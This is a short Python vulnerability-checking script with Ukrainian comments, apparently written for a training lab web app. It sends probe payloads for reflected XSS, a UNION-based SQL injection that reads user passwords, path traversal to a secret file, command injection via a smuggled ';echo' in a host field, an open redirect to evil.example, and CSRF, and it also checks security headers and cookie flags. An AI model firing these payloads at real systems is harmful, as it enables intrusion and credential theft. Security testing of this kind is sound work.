import sys
import requests

base = sys.argv[1].rstrip("/")
s = requests.Session()
results = []

def check(name, vulnerable, evidence=""):
    results.append((name, "ВРАЗЛИВО" if vulnerable else "ОК", evidence))

# 1. Відображений XSS
payload = "<script>alert(1)</script>"
r = s.get(base + "/search", params={"q": payload})
check("XSS /search", payload in r.text, f"HTTP {r.status_code}")

# 2. SQL-ін'єкція
r = s.get(base + "/user", params={"id": "1 UNION SELECT id, username, password FROM users"})
check("SQLi /user", "S3cr3t-admin" in r.text, f"HTTP {r.status_code}")

# 3. Path Traversal
r = s.get(base + "/file", params={"name": "../secret.txt"})
check("Path Traversal /file", "LAB7-SECRET-FLAG" in r.text, f"HTTP {r.status_code}")

# 4. Ін'єкція команд
r = s.get(base + "/diag", params={"host": "x;echo $((6*7))"})
check("Command Injection /diag", "42" in r.text, f"HTTP {r.status_code}")

# 5. Відкрите перенаправлення
r = s.get(base + "/go", params={"url": "https://evil.example"}, allow_redirects=False)
check("Open Redirect /go", r.headers.get("Location", "").startswith("https://evil.example"),
      f"Location={r.headers.get('Location')}")

# 6. Заголовки безпеки та cookie
r = s.get(base + "/")
missing = [h for h in ("Content-Security-Policy", "X-Frame-Options", "X-Content-Type-Options") if h not in r.headers]
check("Заголовки безпеки", bool(missing), "відсутні: " + ", ".join(missing) if missing else "усі наявні")
cookie = r.headers.get("Set-Cookie", "")
check("Cookie HttpOnly/SameSite", "HttpOnly" not in cookie or "SameSite" not in cookie, cookie)

# 7. CSRF: POST без токена
r = requests.post(base + "/login", data={"username": "alice", "password": "alice-pass"})
check("CSRF /login", r.status_code != 403, f"HTTP {r.status_code}")

print(f"\nЦіль: {base}\n" + "-" * 78)
for name, status, ev in results:
    print(f"{name:<28} {status:<10} {ev}")
vuln = sum(1 for _, st, _ in results if st == "ВРАЗЛИВО")
print("-" * 78 + f"\nВразливих перевірок: {vuln} з {len(results)}")
sys.exit(1 if vuln else 0)